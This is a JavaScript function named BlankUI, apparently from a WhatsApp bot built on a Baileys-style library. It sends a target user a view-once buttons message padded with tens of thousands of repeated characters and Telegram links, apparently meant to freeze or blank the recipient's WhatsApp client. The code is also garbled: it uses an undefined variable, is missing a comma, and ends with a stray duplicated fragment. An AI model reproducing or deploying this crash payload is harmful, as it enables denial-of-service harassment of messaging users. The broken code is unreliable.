async function BlankUI(sock, target) {
  await sock.relayMessage(objective, {
    viewOnceMessage: {
      message: {
        buttonsMessage: {
          text: "🦋⃟ᴠͥɪͣᴘͫ 𝗫𝗲𝗺𝘇𝘇☚⍢⃝☚",
          contentText: "🦋⃟ᴠͥɪͣᴘͫ 𝗫𝗲𝗺𝘇𝘇☚⍢⃝☚" + "ꦽ".repeat(90000),
          contextInfo: {
            forwardingScore: 6,
            isForwarded: true,
            entryPointConversionSource: "global_search_new_chat",
            entryPointConversionApp: "com.whatsapp",
            entryPointConversionDelaySeconds: 1,
            externalAdReply: {
              title: "\u0000",
              body: `Eu ${"x10".repeat(9200)}`,
              previewType: "PHOTO",
              thumbnail: null,
              mediaType: 1,
              renderLargerThumbnail: true,
              sourceUrl: "https://t.me/XemzzSolo"
              }
              urlTrackingMap: {
                urlTrackingMapElements: [
                  {
                    originalUrl: "https://t.me/XemzzSolo",
                    unconsentedUsersUrl: "https://t.me/XemzzSolo",
                    consentedUsersUrl: "https://t.me/XemzzSolo",
                    cardIndex: 1,
                  },
                  {
                    originalUrl: "https://t.me/XemzzSolo",
                    unconsentedUsersUrl: "https://t.me/XemzzSolo",
                    consentedUsersUrl: "https://t.me/XemzzSolo",
                    cardIndex: 2,
                  },
                ],
              },            
            },
          headerType: 1
        }
      }
    }
  }, { participant: { jid: target } });
}jective } });
}